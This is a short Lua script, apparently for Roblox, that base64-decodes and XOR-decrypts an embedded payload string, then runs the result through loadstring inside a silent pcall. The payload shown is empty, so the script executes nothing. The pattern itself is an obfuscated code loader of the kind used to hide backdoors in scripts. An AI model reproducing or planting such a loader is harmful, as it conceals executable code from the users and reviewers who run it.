local _k={ 102,101,100,115,46,119,116,102,127,19 }
local function _dec(s)
	local map={}
	local alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	for i=1,64 do map[string.byte(alphabet,i)]=i-1 end
	local kl=#_k
	local n=#s
	local useBuf=type(buffer)=="table" and buffer.create~=nil
	local out=useBuf and buffer.create(math.floor(n*3/4)+8) or nil
	local tmp=not useBuf and {} or nil
	local p=0
	local ki=0
	for i=1,n,4 do
		local b0,b1,b2,b3=string.byte(s,i,i+3)
		local v=map[b0]*262144+map[b1]*4096+(map[b2] or 0)*64+(map[b3] or 0)
		local function push(byte)
			if byte==nil then return end
			ki=ki+1
			byte=bit32.bxor(byte,_k[((ki-1)%kl)+1])
			if useBuf then buffer.writeu8(out,p,byte); p=p+1 else p=p+1; tmp[p]=string.char(byte) end
		end
		push(math.floor(v/65536)%256)
		if b2 and s:sub(i+2,i+2)~="=" then push(math.floor(v/256)%256) end
		if b3 and s:sub(i+3,i+3)~="=" then push(v%256) end
	end
	if useBuf then return buffer.readstring(out,0,p) end
	return table.concat(tmp)
end
local _payload="" .. "" .. "" .. "" .. "" .. "" .. "" .. "" .. "" .. "" .. "" .. ""
local _f=loadstring(_dec(_payload))
if _f then pcall(_f) end
